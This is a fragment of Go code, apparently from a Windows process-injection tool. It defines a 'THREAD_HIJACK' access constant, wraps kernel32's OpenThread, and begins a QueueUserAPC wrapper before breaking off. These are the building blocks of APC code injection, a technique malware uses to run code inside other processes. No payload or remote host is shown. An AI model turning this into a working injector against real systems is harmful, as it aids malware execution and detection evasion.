...
const THREAD_HIJACK = (0x0002 | 0x0008 | 0x0010)
...
func OpenThreadFunc(pid int) uintptr {
	OpenThread := kernel32.MustFindProc("OpenThread")

	handle, _, err := OpenThread.Call(THREAD_HIJACK, 0, uintptr(pid))
	fmt.Println(err)
	return (handle)
}

func QueueUserAPCFunc(pfnApc uintptr, hThread uintptr, dwData uintptr) {
